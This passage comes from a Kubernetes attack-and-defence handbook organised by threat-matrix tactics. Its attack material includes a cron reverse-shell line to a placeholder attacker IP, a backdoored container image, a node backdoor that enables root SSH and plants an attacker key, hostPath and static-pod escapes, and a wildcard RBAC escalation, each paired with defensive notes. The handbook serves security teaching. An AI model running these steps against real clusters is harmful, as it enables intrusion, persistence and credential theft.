<img src="../images/Pasted%20image%2020240329001449.png" alt="" /></li>
<li>If you can exec into a pod, you can upload files to a pod as well using <code>kubectl cp &lt;local_file&gt; &lt;podname&gt;:&lt;location_in_pod&gt;</code>
<img src="../images/Pasted%20image%2020240321102339.png" alt="" /></li>
<li>When Exec-ing into a pod, you will by default exec into the first container listed in the pod manifest . If there are multiple containers in a pod you can list them using <code>kubectl get pods &lt;pod_name&gt; -o jsonpath='{.spec.containers[*].name}'</code> which will output the names of each container. Once you have the name of a container you can target it using kubectl with the <code>-c</code> flag: <code>kubectl exec -it &lt;pod_name&gt; -c &lt;container_name&gt; -- sh</code>
<img src="../images/Pasted%20image%2020240321103439.png" alt="" /></li>
</ol>
<blockquote>
<p>Note. This is an instance where I've diverged from <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/">Microsoft's Threat Matrix</a>. I've combined the <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Exec%20into%20container/">Exec into container</a>  and <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/bash%20or%20cmd%20inside%20container/">bash/cmd inside container</a> techniques into one.</p>
</blockquote>
<a class="header" href="print.html#defending-6" id="defending-6"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#new-container" id="new-container"><h1>New container</h1></a>
<p>Launching a new container in a kubernetes cluster is an extermely powerful permission. Launching a new container can be used to attack other pods in the cluster in a few different ways. If you're allowed to specify your own pod manifest, you have lots of options for how to escalate privielges and move laterally into other namespaces. Additionally, any secrets in a namespace that allows for pods to be created can be compromised as they can be mounted into the pods in cleartext using <a href="../Credential_access/Container_service_account.md">Credential Access-&gt; Container Service Account</a>.</p>
<p>The following manifest can be deployed into the cluster using <code>kubectl apply -f &lt;manfiest_name&gt;.yaml</code></p>
<pre><code class="language-yaml"># Mounts the secret db-user-pass into /secrets into the pod
apiVersion: v1
kind: Pod
metadata:
  name: mypod
spec:
  containers:
  - name: mypod
    image: nginx 
    volumeMounts:
    - name: foo
      mountPath: &quot;/secrets&quot;
      readOnly: true
  volumes:
  - name: foo
    secret:
      secretName: db-user-pass 
</code></pre>
<p>After seeing the manifest, it's obvious that the secerts are mounted in the <code>/secrets</code> directory. The secrets will be created in files with the same name of the fields within the secret.
<img src="../images/Pasted%20image%2020240321105551.png" alt="" /></p>
<a class="header" href="print.html#secrets-as-environment-variables" id="secrets-as-environment-variables"><h2>Secrets As Environment Variables</h2></a>
<p>Additionally, secrets can be mounted as environment variables that can be seen by dumping environment variables in a pod. The following manifest puts the kubernetes secrets <code>username</code> and <code>db-user-pass</code> into environment varaibles <code>SECRET_USERNAME</code> and <code>SECRET_PASSWORD</code>, respectively.</p>
<pre><code class="language-yaml"># Mounts the secret db-user-pass -&gt; username 
# into the SECRET_USERNAME environment variable 
# and password into SECRET_PASSWORD
apiVersion: v1
kind: Pod
metadata:
  name: secret-pod
spec:
  containers:
  - name: mycontainer
    image: nginx 
    env:
      - name: SECRET_USERNAME
        valueFrom:
          secretKeyRef:
            name: db-user-pass 
            key: username
      - name: SECRET_PASSWORD
        valueFrom:
          secretKeyRef:
            name: db-user-pass 
            key: password
  restartPolicy: Never
</code></pre>
<p>After the manifest has been applied, the environment variables are accessible inside the pod to an attacker using the <code>env</code> or <code>export</code> commands.
<img src="../images/Pasted%20image%2020240321105836.png" alt="" /></p>
<a class="header" href="print.html#defending-7" id="defending-7"><h4>Defending</h4></a>
<a class="header" href="print.html#defending-8" id="defending-8"><h1>Defending</h1></a>
<p>Use RBAC to ensure that pods cannot be created unless absolutely necessary. Secrets are scoped to namespaces so ensuring namespaces are properly used is important.</p>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è</p>
</blockquote>
<a class="header" href="print.html#application-exploit-rce-" id="application-exploit-rce-"><h1>Application exploit (RCE) üîó</h1></a>
<p>See <a href="../Initial_access/Application_vulnerability.md">Initial access -&gt; Application Vulnerability</a></p>
<a class="header" href="print.html#sidecar-injection" id="sidecar-injection"><h1>Sidecar injection</h1></a>
<p>Pods are comproised of one or more containers. A sidecar container is a container that can be launched in a pod with other containers. This is commonly used for 3rd party programs that do things such as collect logs or configure network proxies.</p>
<p>In the following scenario there is an nginx server called <code>main-application</code>. The main application (in this case  <code>nginx</code>) will eventually output some logs to <code>/var/log/nginx</code>. The problem is that we don't have a way to collect those logs to send to something such as a SIEM. A solution to this would be to mount the path <code>/var/log/nginx</code> and then launch a side car container that is responsible for collecting the logs from <code>/var/log/nginx</code>. In this example, a simple <code>busybox</code> container is started that prints the log files to the screen every 30 seconds. This is a contrived example, but the sidecar could do any number of things.</p>
<pre><code class="language-yaml"># Modified from https://www.airplane.dev/blog/kubernetes-sidecar-container
apiVersion: v1
kind: Pod
metadata:
  name: simple-webapp
  labels:
    app: webapp
spec:
  containers:
    - name: main-application
      image: nginx
      volumeMounts:
        - name: shared-logs
          mountPath: /var/log/nginx
    - name: sidecar-container
      image: busybox
      command: [&quot;sh&quot;,&quot;-c&quot;,&quot;while true; do cat /var/log/nginx/access.log; sleep 30; done&quot;]
      volumeMounts:
        - name: shared-logs
          mountPath: /var/log/nginx
  volumes:
    - name: shared-logs
      emptyDir: {}

---

# Service Configuration
apiVersion: v1
kind: Service
metadata:
  name: simple-webapp
  labels:
    run: simple-webapp
spec:
  ports:
  - port: 80
    protocol: TCP
  selector:
    app: webapp
  type: NodePort
</code></pre>
<p>It's simple to tell how many pods are in a container by seeing the <em>READY</em> column.
<img src="../images/Pasted%20image%2020240321134144.png" alt="" /></p>
<p>If there are multiple containers in a pod you can list them using <code>kubectl get pods &lt;pod_name&gt; -o jsonpath='{.spec.containers[*].name}'</code> which will output the names. Once you have the name of a container you can specifiy it using kubectl with the <code>-c</code> flag. <code>kubectl exec -it &lt;pod_name&gt; -c &lt;container_name&gt; -- sh</code></p>
<p><img src="../images/Pasted%20image%2020240321134104.png" alt="" /></p>
<a class="header" href="print.html#defending-9" id="defending-9"><h4>Defending</h4></a>
<p>From <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Sidecar%20Injection/">Microsoft</a>:</p>
<ul>
<li>Adhear to least-privielge principles</li>
<li>Restrict over permissive containers</li>
<li>Gate images deployed to kubernetes clusters</li>
</ul>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è</p>
</blockquote>
<a class="header" href="print.html#persistence" id="persistence"><h1>Persistence</h1></a>
<p>The persistence tactic lists out some of the common ways that attackers can utilize their access to a cluster to make it easy for they to re-connect to it in case they lose their initial access.</p>
<ul>
<li><a href="./Persistence/Backdoor_container.md">Backdoor Container</a></li>
<li><a href="./Persistence/Writable_hostPath_mount.md">Writable hostPath mount</a></li>
<li><a href="./Persistence/Kubernetes_cronjob.md">Kubernetes Cronjob</a></li>
<li><a href="./Persistence/Malicious_admission_controller.md">Malicious Admission Controller</a></li>
<li><a href="./Persistence/Container_service_account.md">Container Service Account</a></li>
<li><a href="./Persistence/Static_pods.md">Static Pods</a></li>
</ul>
<a class="header" href="print.html#backdoor-container" id="backdoor-container"><h1>Backdoor Container</h1></a>
<p>Fundamentally this is more of a container security issue, not specifically related to Kubernetes. If you're the images you're building applications into are compromised then your cluster can be compromised as well. This would be like if you downloaded an ubuntu ISO that contained malware before you even installed it.</p>
<a class="header" href="print.html#executing-the-attack" id="executing-the-attack"><h2>Executing the attack</h2></a>
<p>Lets create a malicious image with a simple reverse shell backdoor to demonstrate how easy this is. When would we do this? Imagine we have identified that we can upload our own images to a company's container registry such as <a href="https://github.com/goharbor/harbor">harbor</a>. We're going to take advantage of that by uploading our own image, overwriting the &quot;known good&quot;  image that is currently being used. After doing some recon we've identified that the target is pulling a container image called &quot;prod-app-1&quot; to deploy their application into.</p>
<p>First, we must backdoor a container. To do so we're going to use the <code>ubuntu</code> image as our starting point. To download and launch the <code>ubuntu</code> docker image, run <code>docker run -it ubuntu</code></p>
<blockquote>
<p>A quick note, you must be in the <code>docker</code> group to run docker without <code>sudo</code>.  To do so, run <code>sudo groupadd docker</code>, <code>sudo gpasswd -a $USER docker</code>, then run <code>newgrp docker</code></p>
</blockquote>
<p>Next, we're going to need to install cron into our container, add the backdoor, and then ensure cron is running.</p>
<pre><code class="language-bash"># Update the repos and install cron 
apt update -y &amp;&gt; /dev/null &amp;&amp; apt install -y cron &amp;&gt;/dev/null
apt update &amp;&amp; apt install cron
# Create a backdoor using cron.
# Modified from this gist https://gist.github.com/hoefler02/2ca8166c167f147c8fb076b48eb7cb47
(touch .tab ; echo &quot;* * * * * /bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1'&quot; &gt;&gt; .tab ; crontab .tab ; rm .tab) &gt; /dev/null 2&gt;&amp;1
# Ensure cron is running
cron
</code></pre>
<p><img src="../images/2024-03-20_22-51.png" alt="" /></p>
<p>Next we need to save our container as an &quot;image&quot;.  This saves our backdoored <em>ubuntu</em> container as an image called <em>prod-app-1</em> that can be deployed without our malicious configuration.</p>
<pre><code class="language-bash"># Stage the current container into an image
sudo docker commit &lt;container_id&gt; &lt;image_name&gt;

# Save the image as a .tar file for transport to target
sudo docker save &lt;image_name&gt; &gt; &lt;image_name&gt;.tar

# If you want to load the image as a container
sudo docker image load &lt; &lt;image_name&gt;.tar
</code></pre>
<p><img src="../images/2024-03-20_22-57.png" alt="" /></p>
<p>Creating malicious images that are utilized as a &quot;base&quot; container is a¬†<a href="https://sysdig.com/blog/analysis-of-supply-chain-attacks-through-public-docker-images/">common attack vector</a>.</p>
<a class="header" href="print.html#defending-against-the-attack" id="defending-against-the-attack"><h2>Defending against the attack</h2></a>
<a class="header" href="print.html#defending-10" id="defending-10"><h4>Defending</h4></a>
<p>Defending the container security layer is all about ensuring that the environment your application is running inside of is not able to be escaped should an attacker somehow find their way in through a vulnerability found in the code security layer such as command injection.</p>
<p>There are many different ways you can harden your container, however, it should be noted that conventional wisdom states that <a href="https://cloud.google.com/blog/products/gcp/exploring-container-security-an-overview">containers should not be considered a strong security boundary</a>. Even so, hardening your containers is a critical step in implementing defense in depth. Container security done right can greatly increase the time and effort an attacker needs to compromise a cluster.  Here are some high level recommendations for ensuring the container security layer is hardened</p>
<ul>
<li><strong>Pre-commit hooks</strong>: Install and configure pre-commit hooks and code editor extensions to enforce best practices for developers creating containers. One example is using <a href="https://github.com/trufflesecurity/trufflehog">trufflehog</a> to check for secrets before they're committed to code.</li>
<li><strong>SAST Scanning</strong>: Running security scanning tooling such as tooling such as <a href="https://www.kics.io/index.html#">kics</a>, <a href="https://github.com/hadolint/hadolint">hadolint</a>, <a href="https://www.checkov.io/7.Scan%20Examples/Dockerfile.html">checkov</a>, etc against Dockerfiles can help identify misconfigurations in the container images.</li>
<li><strong>Container Registries</strong>: Container registries act as a repository to store container images in after they've been built. Container registries allow you to build an inventory of approved base images that are approved in policy to use. One of the most common base images is <a href="https://hub.docker.com/search?image_filter=official&amp;q=">Alpine Linux</a>, which is an ultra minimal Linux environment. Images can be validated using <a href="https://www.conftest.dev/">conftest</a>. A popular container registry to sign and store these images is <a href="https://github.com/goharbor/harbor">harbor</a> as it is open source, and allows for scanning of images for vulnerabilities which brings us to the next recommendation.</li>
<li><strong>Image Scanning</strong>: Scan container images for known vulnerabilities using tools such as <a href="https://github.com/aquasecurity/trivy">trivy</a>, <a href="https://github.com/quay/clair?tab=readme-ov-file">Clair</a>, or <a href="https://github.com/eliasgranderubio/dagda">Dagda</a>. This should tell you if an application or dependency in your container has a known CVE associated with it. It does not identify <em>new</em> vulnerabilities in your applications.</li>
<li><strong>Container Signing</strong>: Cryptographically signing containers with a tool such as <a href="https://github.com/sigstore/cosign">cosign</a> will allow you to validate that the container image you're deploying is the same image you built and hasn't been infected with malware. (Unless the malware was introduced before you signed it...)</li>
<li><strong>Secrets</strong>: When building docker images, avoid hard-coding secrets into Dockerfiles and environment variables by using the <code>--secrets</code> and <code>--mount</code> flag. This will allow commands in the docker container to pass in secrets from a file and the secrets will not persist in the final container image.</li>
<li><strong>Implement least privilege</strong>: Containers should be minimized as much as possible to remove any unneeded software. It's not uncommon for hardened containers to only have a few binaries installed that make doing <em>anything</em> besides running the intended application a huge pain. This can be done by utilizing multistage builds that build software in the first image, then copy the freshly built binaries into a new container. Operating in this way means the final container image does not have the build tools inside the final container, further minimizing the image.</li>
<li><strong>Monitoring</strong>: Monitoring your containers for suspicious activity can be done by utilizing tools such as <a href="https://github.com/falcosecurity/falco">Falco</a>. While this can generate alerts, it's important that alerts are actionable and monitored. <a href="https://www.blackhillsinfosec.com/real-time-threat-detection-for-kubernetes-with-atomic-red-tests-and-falco">This is a great overview of using Falco</a></li>
</ul>
<a class="header" href="print.html#writable-hostpath-mount" id="writable-hostpath-mount"><h1>Writable hostPath mount</h1></a>
<p>A hostpath mount is a directory or file from the host that is mounted into the pod. If an attacker is able to create a new container in the cluster, they may be able to mount the node's file system which can be exploited in many ways.</p>
<a class="header" href="print.html#kubernetes-volumes" id="kubernetes-volumes"><h2>Kubernetes Volumes</h2></a>
<p>By design, storage within pods do not persist on reboot. Any artifacts saved to a container that are not stored in a volume will be removed when a pod is restarted. Persistent volumes are a way to store data in a pod and have it persist even if the pod is restarted. There are a few different types of volumes but the most interesting one from an attacker perspective is a hostPath volume.</p>
<p>A hostpath volume mounts a file or directory from the host node's filesystem into a pod. Most of the time there is no real reason for this to be done, but it can be an easy way to make things &quot;just work&quot;.</p>
<p>According to the <a href="https://kubernetes.io/docs/concepts/storage/volumes/">documentation</a>, there are a few hostPath <em>types</em> you can pass to the manfest when creating a hostpath:</p>
<ul>
<li><code>&quot;&quot;</code>: Empty string (default) is for backward compatibility, which means that no checks will be performed before mounting the hostPath volume.</li>
<li><code>DirectoryOrCreate</code>: If nothing exists at the given path, an empty directory will be created there as needed with permission set to 0755, having the same group and ownership with Kubelet.</li>
<li><code>Directory</code>: A directory must exist at the given path</li>
<li><code>FileOrCreate</code>: If nothing exists at the given path, an empty file will be created there as needed with permission set to 0644, having the same group and ownership with Kubelet.</li>
<li><code>File</code>: A file must exist at the given path</li>
<li><code>Socket</code>: A UNIX socket must exist at the given path</li>
<li><code>CharDevice</code>: (Linux nodes only) A character device must exist at the given path</li>
<li><code>BlockDevice</code>: (Linux nodes only) A block device must exist at the given path</li>
</ul>
<a class="header" href="print.html#example-attack" id="example-attack"><h2>Example Attack</h2></a>
<p>Lets imagine that we have somehow discovered that there is a manifest that is utilizing a hostPath mount to mount the root directory(<code>/</code>) of the node into a pod.</p>
<p>The manifest may look simliar to below.</p>
<pre><code class="language-yaml"># Dangerous
apiVersion: v1
kind: Pod
metadata:
  name: vuln-nginx
  namespace: dmz
spec:
  containers:
  - name: vuln-nginx
    image: nginx
    volumeMounts:
    - name: hostmount
      mountPath: /nodeFS

  volumes:
  into the pod&quot;
  - name: hostmount
    hostPath:
      path: /  
</code></pre>
<p>Lets assume that at some point a kubernetes admin made a <code>dmz</code> namespace and applied this vulnerable manifest to it.</p>
<p><img src="../images/Pasted%20image%2020240331195411.png" alt="" /></p>
<p>As an attacker we either are lucky enough to find ourselves already in the <code>vuln-nginx</code> pod, or we exec into the pod. Upon looking at the file system, we can see that the <code>nodeFS</code> directory contains the contents of the filesystem of the node running the pod. We can exploit this by utilzing <a href="./Persistence/Static_pods.md">Persistence -&gt; Static pod</a> to spawn a pod outside of the <code>dmz</code> namespace.</p>
<p><img src="../images/Pasted%20image%2020240331195500.png" alt="" /></p>
<p>Going back to the cluster, we can query the API server for pods in the <code>production</code> namespace by running <code>kubectl get pods -n production</code>. We can see that the yaml written to <code>/nodeFS/etc/kubernetes/manifests/jump2prod.yaml</code> was picked up by the kubelet and launched.</p>
<p><img src="../images/Pasted%20image%2020240331195512.png" alt="" /></p>
<p>Indeed, it seems the <code>jump2prod</code> container was created. Note that the node name was appended to our pod as discussed previously. This is great for jumping into another namespace, but from this <code>FINISH</code></p>
<a class="header" href="print.html#attack-2" id="attack-2"><h1>Attack 2</h1></a>
<p>Lets assume the following manifest was used to deploy an nginx server into the DMZ. Due to the houstmount giving us access to <code>/etc/kubernetes/</code> path, we will be able to take over the cluster.</p>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: vuln-nginx 
  namespace: dmz
spec:
  containers:
  - name: vuln-nginx
    image: nginx 
    volumeMounts:
    - name: hostmount
      mountPath: /goodies

  volumes:
  - name: hostmount 
    hostPath:
      path: /etc/kubernetes/
</code></pre>
<p>In this scenario, the path <code>/etc/kubernetes</code> on the node was mounted into the pod under <code>/goodies</code>. Looking at this directory, we can see that there is indeed some configuration files for the kubelet as well as the manifests directory.</p>
<p><img src="../images/Pasted%20image%2020240331195602.png" alt="" /></p>
<p>With this information, we can probably create a <a href="./Persistence/Static_pod.md">Persistence -&gt; Static Pod</a>. In order to exploit this, we are going to create a static pod with an additional hostmount, but this time we are going to mount the root of the node <code>/</code> into the directory <code>/pwnd</code>. To facilitate this we will create a new manifest that will perform these mounts in a pod called <code>ohnode</code></p>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: ohnode 
  namespace: kube-system 
spec:
  containers:
  - name: ohnode 
    image: nginx 
    volumeMounts:
    - name: hostmount
      mountPath: /pwnd

  volumes:
  - name: hostmount 
    hostPath:
      path: /

</code></pre>
<p>To create the static pod, we simply place this manifest into the <code>/etc/kubernetes/manifests</code> directory and the kubelet will start the pod. Looks like our pod was created in the <code>kube-system</code> namespace.</p>
<p><img src="../images/Pasted%20image%2020240331195652.png" alt="" /></p>
<p>Lets exec into the pod. We can see that <code>/pwnd</code> exists and upon moving into it we see the <code>/</code> of the node's file system. To make things a little simpler, <code>chroot /pwnd</code> to make sure our we don't accidentially mess up our paths and put something in the wrong directory on the pod's filesystem.</p>
<p>Finally, lets backdoor the node with cron so that we can SSH to it. In this example, we will assume the node has cron installed and the cron service is running(by default minikube does not). To backdoor the node and ensure SSH is running, run the following commands</p>
<pre><code class="language-bash"># Place our backdoor script into /tmp/ssh.sh
# This will be ran by cron
cat &lt;&lt; EOF &gt; /tmp/ssh.sh
apt update ; apt install openssh-server -y ; mkdir -p /var/run/sshd &amp;&amp; sed -i 's/\#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config &amp;&amp; sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd ; mkdir -p ~/.ssh &amp;&amp; touch authorized_keys ; echo &quot;YOUR PUBLIC KEY HERE&quot; &gt;&gt; ~/.ssh/authorized_keys ; /usr/sbin/service ssh restart

# Then type EOF and press enter

# Ensure the script has execute permissions
chmod +x /tmp/ssh.sh

# This will keep adding your SSH key
# you could change `&gt;&gt;` to `&gt;` but that will overwrite other keys in there.
echo &quot;* * * * * root cd /tmp &amp;&amp; sh ssh.sh&quot; &gt;&gt; /etc/cron.d/ssh
</code></pre>
<p><img src="../images/Pasted%20image%2020240331195709.png" alt="" /></p>
<p>Now, assuming cron is running on the node, wait about a minue and you should see that your public key has been added to <code>/root/.ssh/authorized_keys</code>!</p>
<p>Now all you need to do is ssh into the node (assuming there is no firewalls in the way): <code>ssh -i &lt;key&gt; root@&lt;node&gt;</code></p>
<p><img src="../images/Pasted%20image%2020240331195726.png" alt="" /></p>
<a class="header" href="print.html#defending-11" id="defending-11"><h1>Defending</h1></a>
<ul>
<li>From <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/">microsoft</a>:
<ul>
<li>Restrict over permissive containers using something such as [[admission controller]]s</li>
<li>Restrict file and directory permissions by ensuring mounts are read only</li>
<li>Restrict containers using linux security modules such as [[AppArmor]] or [[SELinux]]</li>
<li>Ensure that pods meet defined [[pod security standards]]. Baseline or restricted will stop volume mounts.</li>
</ul>
</li>
</ul>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#kubernetes-cronjob" id="kubernetes-cronjob"><h3>Kubernetes cronjob</h3></a>
<p>Kubernetes cronjobs are fundamentally the same as linux cronjobs that can be deployed with Kubernetes manifests. They perform actions on a schedule denoted by the contab syntax. <a href="https://crontab.guru/">Crontab Guru</a> is a great resource for getting the cron schedule you want.</p>
<p>Like every other object in Kubernetes, you declare your cronjob in a manifest and then submit it to the API server using <code>kubectl apply -f &lt;cronjob_name&gt;.yaml</code>. When creating a cronjob, you must specify what container image you want your cronjob to run inside of.</p>
<pre><code class="language-yaml"># Modified From https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/
apiVersion: batch/v1
kind: CronJob
metadata:
  name: anacronda
spec:
  schedule: &quot;* * * * *&quot; # This means run every 60 seconds
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: anacronda 
            image: busybox:1.28
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - date; echo Hello from the Kubernetes cluster
          restartPolicy: OnFailure
</code></pre>
<p><img src="../images/Pasted%20image%2020240321160119.png" alt="" /></p>
<a class="header" href="print.html#defending-12" id="defending-12"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#malicious-admission-controller" id="malicious-admission-controller"><h1>Malicious Admission Controller</h1></a>
<p>Admission controllers are components that can intercept requests to the API server and make changes to (or validate) manifests. An attacker can intercept and modify the manifests before they are deployed into the cluster. The following code snippet is an example:</p>
<pre><code class="language-go">// Example from: https://medium.com/ovni/writing-a-very-basic-kubernetes-mutating-admission-webhook-398dbbcb63ec
p := []map[string]string{}for i := range pod.Spec.Containers {    patch := map[string]string{  
        &quot;op&quot;: &quot;replace&quot;,  
        &quot;path&quot;: fmt.Sprintf(&quot;/spec/containers/%d/image&quot;, i),   
        &quot;value&quot;: &quot;debian&quot;,  
    }
p = append(p, patch)
}
// parse the []map into JSON  
resp.Patch, err = json.Marshal(p)
</code></pre>
<a class="header" href="print.html#defending-13" id="defending-13"><h1>Defending</h1></a>
<p>From <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Malicious%20admission%20controller/">microsoft</a>: Adhere to least privielge princples by restricting permissions to deploy or modify MutatingAdmissionWebhook and ValidatingAdmissionWebhook objects.</p>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#container-service-account" id="container-service-account"><h1>Container Service Account</h1></a>
<p>See <a href="../Credential_access/Container_service_account.md"> Credential Access -&gt; Container Service Account</a></p>
<p>Static pods in Kubernetes are interesting from an attacker perspective because the are created without needing the API server. A static pod is instead managed by the kubelet service running on a node.</p>
<p>With that being said, if a static pod is created, the kubelet will try to create a <strong>mirror pod</strong> on the API server, but the pod cannot be controlled by the API server. Static pods have the name of the node they're running on appended to the end of them. By default, the kubelet watches the directory <code>/etc/kubernetes/manifests</code> for new manifests. If an attacker is able to somehow place a manifest inside this directory, it will be run (although sometimes you may need to restart the kubelet).</p>
<blockquote>
<p>Note: This bypassess admission controllers</p>
</blockquote>
<p>Static pods cannot be used to do things such as mount secrets.</p>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: vuln-nginx 
  namespace: dmz
spec:
  containers:
  - name: vuln-nginx
    image: nginx 
    volumeMounts:
    - name: hostmount
      mountPath: /goodies

  volumes:
  - name: hostmount 
    hostPath:
      path: /etc/kubernetes/
</code></pre>
<p><img src="../images/Pasted%20image%2020240331195846.png" alt="" />
<img src="Pasted%20image%2020240331195849.png" alt="" /></p>
<a class="header" href="print.html#defending-14" id="defending-14"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#privilege-escalation" id="privilege-escalation"><h1>Privilege escalation</h1></a>
<p>The privilege escalation technique is a list of ways that attackers can escalate from their current level of access to a higher level of access. This typically means going from a Pod to taking over a Node or Cluster but can also be escalating from a pod with little permissions to one with higher permissions. Additionally, if a cluster is deployed in a cloud environment, privilege escalation can also include accessing other resources in the cloud environment.</p>
<ul>
<li><a href="./Privilege_escalation/Privileged_container.md">Privileged Container</a></li>
<li><a href="./Privilege_escalation/Cluster-admin_binding.md">Cluster-admin binding</a></li>
<li><a href="./Privilege_escalation/hostPath_mount.md">hostPath Mount</a></li>
<li><a href="./Privilege_escalation/Access_cloud_resources.md">Access Cloud Resources</a></li>
</ul>
<a class="header" href="print.html#privileged-container" id="privileged-container"><h1>Privileged container</h1></a>
<p>Privileged containers represent a very dangerous permission that can be applied in a pod manifest and should almost never be allowed. Privileged pods are set under the <code>securityContext</code>. Privileged containers essentially share the same resources as the host node and do not offer any security boundary normally provided by a container. Running a privileged pod dissolves nearly all isolation between the container and the host node.</p>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: priv-pod 
spec:
  hostNetwork: true
  containers:
  - name: priv-pod 
    image: nginx 
    securityContext:
            privileged: true
</code></pre>
<a class="header" href="print.html#defending-15" id="defending-15"><h1>Defending</h1></a>
<p>From microsoft:</p>
<ul>
<li>Restrict over permissive containers: Block privileged containers using admission controllers</li>
<li>Ensure that pods meet defined pod security standards: restrict privileged containers using pod security standards</li>
<li>Gate images deployed to Kubernetes cluster: Restricted deployment of new containers from trusted supply chains</li>
</ul>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#cluster-admin-binding" id="cluster-admin-binding"><h1>Cluster-admin binding</h1></a>
<p>The <code>cluster-admin</code> ClusterRole is a default ClusterRole in Kubernetes. This is a super user that can perform any action on any resource in the cluster. Think of this as the root user of a cluster. If an attacker is somehow allowed the ability to apply RoleBindings or ClusterRoleBindings, they could escalate to <code>cluster-admin</code>. It's important to note that this is fairly unlikely to be a direct attack path due to the way Kubernetes handles RBAC.</p>
<p><img src="../images/Pasted%20image%2020240331195049.png" alt="" /></p>
<p>Kubernetes RBAC has an interesting way of <a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping">preventing privilege escalation</a>. Essentially, you cannot create permissions that you do not already have unless you have the <code>escalate</code> verb RBAC for your Role or ClusterRole. You can see that even though this account is allowed to create roles, RBAC is not allowing me to create a role that doesn't have permissions my current role doesn't have.</p>
<p><img src="../images/Pasted%20image%2020240331195103.png" alt="" /></p>
<a class="header" href="print.html#namespace-admin-privilege-escalation" id="namespace-admin-privilege-escalation"><h2>Namespace Admin Privilege Escalation</h2></a>
<p>Although RBAC does it's best to not allow privilege escalation, it can still be possible if the Role associated with a ServiceAccount has either the <code>escalate</code> verb or a <code>*</code> for the RoleBinding and Role resource. The following Role applied to a ServiceAccount will allow an attacker to gain full control over the namespace due to the <code>Role</code> and <code>RoleBinding</code> resources being granted the access to all the RBAC verbs (including <code>escalate</code>).</p>
<pre><code class="language-yaml">apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-view
rules:
- apiGroups: [&quot;&quot;]
  resources: [&quot;pods&quot;]
  verbs: [&quot;create&quot;,&quot;get&quot;, &quot;watch&quot;, &quot;list&quot;]
- apiGroups: [&quot;*&quot;]
  resources: [&quot;roles&quot;]
  verbs: [&quot;*&quot;]
- apiGroups: [&quot;*&quot;]
  resources: [&quot;rolebindings&quot;]
  verbs: [&quot;*&quot;]

</code></pre>
<p>The attack path for this is to create a new Role and Rolebinding and apply it to the ServiceAccount context we are operating under when inside pod.</p>
<p>The following Role named <code>pwnd</code> grants essentially admin powers over all resources in all apiGroups.</p>
<pre><code class="language-yaml">apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default 
  name: pwnd 
rules:
- apiGroups: [&quot;*&quot;]
  resources: [&quot;*&quot;]
  verbs: [&quot;*&quot;]
</code></pre>
<p>The following RoleBinding will bind the role <code>pwnd</code> to the ServiceAccount <code>pod-view</code></p>
<pre><code class="language-yaml">apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: pwnd 
  namespace: default 
roleRef: # points to the Role
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: pwnd # name of Role
subjects: # points to the ServiceAccount
- kind: ServiceAccount
  name: pod-view 
  namespace: default # ns of service account
</code></pre>
<p>Since we have a <code>*</code> in the RBAC permissions for roles and rolebindings, we can submit this Role and Rolebinding to the API server from the pod. After creating them, running <code>kubectl auth can-i --list</code> shows us that we are now essentially an admin within our namespace.</p>
<p><img src="../images/Pasted%20image%2020240331195216.png" alt="" /></p>
<p>To prove that we have further escalated our privileges, we can attempt to take an action we we previously were not able to take such as listing secrets in the namespace.</p>
<p><img src="../images/Pasted%20image%2020240331195228.png" alt="" /></p>
<a class="header" href="print.html#defending-16" id="defending-16"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#hostpath-mount" id="hostpath-mount"><h1>hostPath mount</h1></a>
<p>See <a href="../Persistence/Writable_hostPath_mount.md">Persistence -&gt; Writable hostPath Mount</a></p>
<a class="header" href="print.html#access-cloud-resources" id="access-cloud-resources"><h1>Access Cloud Resources</h1></a>
<p>See <a href="../Credential_access/Access_managed_identity_credentials.md">Credential Access -&gt; Access managed identity credentials</a></p>
<a class="header" href="print.html#defense-evasion" id="defense-evasion"><h1>Defense evasion</h1></a>
<p>The defense evasion tactic is a few ways that attackers can hide or obfuscate their tracks</p>
<ul>
<li><a href="./Defense_evasion/Clear_container_logs.md">Clear Container Logs</a></li>
<li><a href="./Defense_evasion/Delete_events.md">Delete Events</a></li>
<li><a href="./Defense_evasion/Pod_name_similarity.md">Pod Name Similarity</a></li>
<li><a href="./Defense_evasion/Connect_from_proxy_server.md">Connect From Proxy Server</a></li>
